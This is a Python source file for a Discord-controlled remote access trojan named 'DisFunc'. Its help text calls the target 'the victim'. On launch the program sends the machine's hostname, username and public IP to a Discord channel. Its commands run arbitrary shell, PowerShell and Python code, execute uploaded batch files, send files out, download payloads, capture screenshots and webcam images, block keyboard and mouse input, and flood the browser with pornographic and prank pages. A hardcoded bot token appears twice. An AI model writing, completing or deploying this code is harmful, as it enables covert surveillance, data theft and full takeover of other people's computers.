'MTAzNTUyMjA2NjI0NzU5MDAxOA.GdAbAg.z-5c-58c59Lqp2BNKwwE3AAmrLawKoTZTe3ke4'
import webbrowser
import os
import cv2
import logging
import threading
from pynput.keyboard import Listener
import getpass
import discord
import random
import asyncio
import ctypes
import socket
import pyautogui
from ctypes import wintypes
import psutil
import platform
import requests
import subprocess
from discord.ext import commands


intents = discord.Intents.default()
intents.typing = False
intents.presences = False

def GetIP():
    ip = requests.get("https://api.ipify.org").text
    return ip

def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

DisFunc = commands.Bot(description='DisFunc', command_prefix='?', bot=True, intents=intents)
DisFunc.remove_command('help')
loop = asyncio.get_event_loop()

@DisFunc.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send('Command not found!')
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send('Missing argument!')

@DisFunc.event
async def on_ready():
    hostname = socket.gethostname()
    channel = DisFunc.get_channel(1114220282614390788)  # Replace with your desired channel ID 
    user = getpass.getuser()
    ip = GetIP()

    embed = discord.Embed(title=':white_check_mark: DisFunc Connection', description='** **', colour=discord.Color.random())
    embed.add_field(name=f':computer: Hostname: `{hostname}`', value='** **', inline=False)
    embed.add_field(name=f':man: User: `{user}`', value='** **', inline=False)
    embed.add_field(name=':globe_with_meridians: IP: `' + ip + '`', value='** **', inline=False)
    embed.add_field(name=':keyboard: Prefix: `?`', value='** **', inline=False)

    embed.set_footer(text='Credit to [syntheticlol](https://github.com/syntheticlol)')
    await channel.send(embed=embed)

    await channel.send("To execute commands, please respond to bot messages.")






@DisFunc.command()
async def blockinput(ctx):
    BlockInput = ctypes.windll.user32.BlockInput
    BlockInput.argtypes = [wintypes.BOOL]
    BlockInput.restype = wintypes.BOOL

    blocked = BlockInput(True)
    if blocked:
        print("Input blocked.")
    else:
        print("Input is already blocked by another thread.")


@DisFunc.command()
async def unblockinput(ctx):
    BlockInput = ctypes.windll.user32.BlockInput
    BlockInput.argtypes = [wintypes.BOOL]
    BlockInput.restype = wintypes.BOOL

    blocked = BlockInput(False)
    if not blocked:
        await ctx.send("Input unblocked.")
    else:
        await ctx.send("Failed to unblock input.")








@DisFunc.command()
async def webcam(ctx):
    cap = cv2.VideoCapture(0)  # Open webcam capture

    if not cap.isOpened():
        await ctx.send("Failed to open the webcam.")
        return

    ret, frame = cap.read()  # Read a frame from the webcam

    if not ret:
        await ctx.send("Failed to capture a frame from the webcam.")
        return

    # Save the frame as an image file
    output = "webcam.jpg"
    cv2.imwrite(output, frame)

    # Send the image file to the channel
    await ctx.send(file=discord.File(output))

    # Clean up
    cap.release()
    cv2.destroyAllWindows()






@DisFunc.command()
async def cmd(ctx, *, cmds):
    await ctx.message.delete()

    try:
        output = subprocess.check_output(cmds, shell=True, text=True, stderr=subprocess.STDOUT)
        await ctx.send(f"```{output}```")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Command failed with exit code {e.returncode}\nError: {e.output}")









@DisFunc.command()
async def upload(ctx, *, file_info):
    components = file_info.split()
    filepath = " ".join(components[:-1])  # Join the path components, excluding the last element
    channel_id = components[-1]  # Get the last element as the channel ID

    channel = DisFunc.get_channel(int(channel_id))
    if os.path.exists(filepath):
        await channel.send(file=discord.File(filepath))
        await ctx.send(f'File uploaded to channel: {channel.mention}')
    else:
        await ctx.send('File not found!')




@DisFunc.command()
async def cd(ctx, path: str):
    try:
        os.chdir(path)
        await ctx.send(f"Working directory changed to: {os.getcwd()}")
    except FileNotFoundError:
        await ctx.send("Directory not found!")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")









@DisFunc.command()
async def website(ctx, websiteu: str):
    try:
        webbrowser.open(websiteu)
        await ctx.send(f"Opened website: {websiteu}")
    except webbrowser.Error:
        await ctx.send("Failed to open website")











@DisFunc.command()
async def ahah(ctx):
    website = "https://www.youtube.com/watch?v=poMXl_nOAXU"
    windows = 100
    for _ in range(windows):
        webbrowser.open(website)
    await ctx.send("ahlayan kadın sesi acılıyor")




















@DisFunc.command()
async def help(ctx):
    embed = discord.Embed(title="Bot Commands", description="List of available commands", color=discord.Color.blue())

    embed.add_field(name="?ps <command>", value="Run a command in PowerShell", inline=False)
    embed.add_field(name="?cmd <command>", value="Execute a command", inline=False)
    embed.add_field(name="?upload <path> <channel_id>", value="Upload a file from victim to the specified channel", inline=False)
    embed.add_field(name="?nano <filepath>", value="Write contents to a file using nano", inline=False)
    embed.add_field(name="?screenshot", value="Get a screenshot of the victim's computer", inline=False)
    embed.add_field(name="?furryporn", value="View furry pornography (not recommended)", inline=False)
    embed.add_field(name="?rickroll", value="Rickroll the victim (not recommended)", inline=False)
    embed.add_field(name="?usage", value="Show CPU and RAM usage", inline=False)
    embed.add_field(name="?ahah", value="Special ahlayan kadın sesi for Turkish people", inline=False)
    embed.add_field(name="?download <link>", value="Download a file from a link", inline=False)
    embed.add_field(name="?website <url>", value="Sends the user to a website of choice", inline=False)
    embed.add_field(name="?execpy <python command>", value="Execute a Python command provided by the user", inline=False)
    embed.add_field(name="?execpyfile", value="Execute a .py file provided by the user", inline=False)
    embed.add_field(name="?execbat <executable .bat file>", value="Execute an bat file provided by the user", inline=False)
    embed.add_field(name="?sysinfo", value="Show system info", inline=False)
    embed.add_field(name="?webcam", value="capture a webcam image", inline=False)
    embed.add_field(name="?unblockinput", value="unblock input", inline=False)
    embed.add_field(name="?blockinput ", value="blocks mouse keyboard everthing", inline=False)

    embed.set_footer(text="Credit to: https://github.com/syntheticlol")

    await ctx.send(embed=embed)



@DisFunc.command()
async def execbat(ctx):
    attachments = ctx.message.attachments
    if not attachments:
        await ctx.send('No file attached.')
        return

    attachment = attachments[0]
    if not attachment.filename.endswith('.bat'):
        await ctx.send('Invalid file format. Only .bat files are supported.')
        return

    file_path = attachment.filename
    try:
        await attachment.save(file_path)
        result = subprocess.run(file_path, capture_output=True, text=True, shell=True)
        output = result.stdout if result.stdout else result.stderr
        await ctx.send(f'Command executed:\n```{output}```')
    except Exception as e:
        await ctx.send(f'An error occurred while executing the command:\n```{str(e)}```')
    finally:
        # Delete the file after execution
        subprocess.run(f'del {file_path}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)





@DisFunc.command()
async def sysinfo(ctx):
    # Get system information using platform module
    system_info = platform.uname()

    # Get CPU usage percentage
    cpu_usage = psutil.cpu_percent()

    # Get memory usage
    memory = psutil.virtual_memory()
    total_memory = round(memory.total / (1024 ** 3), 2)
    used_memory = round(memory.used / (1024 ** 3), 2)
    memory_usage = memory.percent

    # Create an embed message with system information
    embed = discord.Embed(title="System Information", color=discord.Color.blue())
    embed.add_field(name="System", value=f"```{system_info.system}```", inline=False)
    embed.add_field(name="Node Name", value=f"```{system_info.node}```", inline=True)
    embed.add_field(name="Release", value=f"```{system_info.release}```", inline=True)
    embed.add_field(name="Version", value=f"```{system_info.version}```", inline=True)
    embed.add_field(name="Machine", value=f"```{system_info.machine}```", inline=True)
    embed.add_field(name="Processor", value=f"```{system_info.processor}```", inline=True)
    embed.add_field(name="CPU Usage", value=f"```{cpu_usage}%```", inline=False)
    embed.add_field(name="Memory Usage", value=f"```{used_memory} GB / {total_memory} GB ({memory_usage}%)```", inline=False)

    await ctx.send(embed=embed)








@DisFunc.command()
async def execpyfile(ctx):
    attachment = ctx.message.attachments[0]  # İlk ek dosyayı al

    if attachment.filename.endswith(".py"):  # Dosya uzantısı .py ise devam et
        try:
            code = await attachment.read()  # Dosyayı oku
            exec(code)  # Kodu çalıştır
        except Exception as e:
            await ctx.send(f"An error occurred:\n```{traceback.format_exc()}```")
    else:
        await ctx.send("The attached file must be a Python (.py) file.")








@DisFunc.command()
async def execpy(ctx, *, code):
    try:
        code_lines = code.split("\n")  # Kodu satırlara ayır
        for line in code_lines:
            exec(line)  # Her satırı tek tek çalıştır
    except Exception as e:
        await ctx.send(f"An error occurred:\n```{traceback.format_exc()}```")


@DisFunc.command()
async def ps(ctx, *, command):
    try:
        # Construct the PowerShell command
        powershell_command = f'powershell.exe -command "{command}"'
        
        # Run the PowerShell command using subprocess
        output = subprocess.check_output(powershell_command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        
        await ctx.send(f"```\n{output}\n```")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"An error occurred: {e.output}")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")




@DisFunc.command()
async def nano(ctx, filepath, *, content=""):
    try:
        if not content:
            # If no content is provided, read and send the existing file content
            with open(filepath, 'r') as file:
                file_content = file.read()
            await ctx.send(f"```{file_content}```")
        else:
            # Write the provided content to the file
            with open(filepath, 'w') as file:
                file.write(content)
            await ctx.send(f"File '{filepath}' has been created and written.")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")





@DisFunc.command()
async def furryporn(ctx):
    website = "https://www.pornhub.com/view_video.php?viewkey=63d567c6732bd"
    windows = 100
    for _ in range(windows):
        webbrowser.open(website)
    await ctx.send("Opening furryporn video...")

@DisFunc.command()
async def rickroll(ctx):
    website = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
    windows = 100
    for _ in range(windows):
        webbrowser.open(website)
    await ctx.send("Opening rickroll video...")
    
   
@DisFunc.command()
async def download(ctx, url: str):
    response = requests.get(url)
    if response.status_code == 200:
        file_name = url.split('/')[-1]
        with open(file_name, 'wb') as file:
            file.write(response.content)
        await ctx.send(f"File downloaded: {file_name}")
    else:
        await ctx.send("Failed to download file.")

   


@DisFunc.command()
async def usage(ctx):
    disku = psutil.disk_usage("/")
    totaldick = round(disku.total / (1024 ** 3), 2)
    useddick = round(disku.used / (1024 ** 3), 2)
    dickperc = disku.percent

    cpuperc = psutil.cpu_percent()
    mem = psutil.virtual_memory()
    totalram = round(mem.total / (1024 ** 3), 2)
    usedram = round(mem.used / (1024 ** 3), 2)
    ramperc = mem.percent

    embed = discord.Embed(title="System Usage", color=discord.Color.purple())
    embed.add_field(name="Disk", value=f"```{useddick} GB / {totaldick} GB ({dickperc}%)```", inline=False)
    embed.add_field(name="CPU", value=f"```{cpuperc}%```", inline=False)
    embed.add_field(name="RAM", value=f"```{usedram} GB / {totalram} GB ({ramperc}%)```", inline=False)

    await ctx.send(embed=embed)


@DisFunc.command()
async def screenshot(ctx):
    try:
        # Capture the screenshot
        screenshot = pyautogui.screenshot()
        # Save the screenshot as a file
        screenshot.save('screenshot.png')
        # Send the screenshot file in the Discord channel
        await ctx.send("Screenshot", file=discord.File('screenshot.png'))
    except Exception as e:
        await ctx.send(f"An error occurred while capturing the screenshot: {str(e)}")

# Replace with your bot token
loop.create_task(DisFunc.start('MTAzNTUyMjA2NjI0NzU5MDAxOA.GdAbAg.z-5c-58c59Lqp2BNKwwE3AAmrLawKoTZTe3ke4'))

try:
    loop.run_forever()
except KeyboardInterrupt:
    loop.run_until_complete(DisFunc.close())
finally:
    loop.close()
